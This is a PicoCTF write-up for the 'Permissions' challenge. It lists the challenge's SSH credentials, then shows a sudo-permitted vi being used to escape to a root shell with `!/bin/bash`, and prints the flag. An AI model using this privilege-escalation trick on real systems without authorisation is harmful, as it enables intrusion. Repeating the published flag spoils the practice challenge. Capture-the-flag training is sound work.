---
title: "Permissions from PicoCTF"
categories: [PicoCTF]
tags: [PicoCTF]
---
# Permissions from PicoCTF
[page](https://play.picoctf.org/practice/challenge/363?category=5&difficulty=2&page=1&search=&solved=0)


> Description
Can you read files in the root file?The system admin has provisioned an account for you on the main server:
`ssh -p 64357 picoplayer@saturn.picoctf.net`
Password: `33qE7mB5BF`
Can you login and read the root file?

>Hints
>What permissions do you have?

Let's connect to ssh and type `sudo -l` this shows on what root permissions we have on picoplayer:
```
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```
And we see `vi` text editor. With `sudo vi` we can create an file with sudo permission and execute it with this code:
```
picoplayer@challenge:~$ sudo vi test
```
and when we open the text editor press `esc` and then type `!/bin/bash` to execute it.
It will look like this:
```
:.!/bin/bash

```
This will make you root, Head to root directory and then write 
`ls -all` and you will see the flag:
**picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4}**

